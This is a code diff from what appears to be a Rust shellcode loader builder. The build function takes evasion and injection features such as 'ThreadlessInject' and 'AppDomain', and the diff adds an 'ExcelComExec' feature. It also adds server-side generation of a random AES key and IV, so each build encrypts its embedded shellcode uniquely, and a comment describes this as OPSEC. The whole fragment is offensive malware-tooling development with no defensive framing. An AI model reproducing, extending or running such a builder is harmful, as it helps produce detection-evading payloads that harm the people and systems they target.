@@ -153,6 +153,7 @@ fn run_build(
             "AppDomain"        => Some(Feature::AppDomain),
             "ThreadlessInject" => Some(Feature::ThreadlessInject),
             "Compress"         => Some(Feature::Compress),
+            "ExcelComExec"     => Some(Feature::ExcelComExec),
             _                  => None,
         }).collect();
 
@@ -170,10 +171,25 @@ fn run_build(
     }
 
     let mut sc_hex  = req.shellcode_hex.replace(' ', "");
-    let key_hex = req.key_hex.replace(' ', "");
-    let iv_hex  = req.iv_hex.replace(' ', "");
+    let mut key_hex = req.key_hex.replace(' ', "");
+    let mut iv_hex  = req.iv_hex.replace(' ', "");
 
     let is_staged_mode = req.staged.is_some();
+
+    // Frontend usually omits key/iv (no UI for them) — server generates secure
+    // random material so each build has unique AES key + IV. Same effective
+    // OPSEC as user-supplied; doesn't change the loader code path.
+    use rand::RngCore;
+    if key_hex.is_empty() {
+        let mut k = [0u8; 32];
+        rand::thread_rng().fill_bytes(&mut k);
+        key_hex = k.iter().map(|b| format!("{:02x}", b)).collect();
+    }
+    if iv_hex.is_empty() {
+        let mut i = [0u8; 16];
+        rand::thread_rng().fill_bytes(&mut i);
+        iv_hex = i.iter().map(|b| format!("{:02x}", b)).collect();
+    }
 
     // If Compress feature requested AND payload is embedded (not staged),
     // raw-deflate the shellcode bytes here. The C# templates' decompression
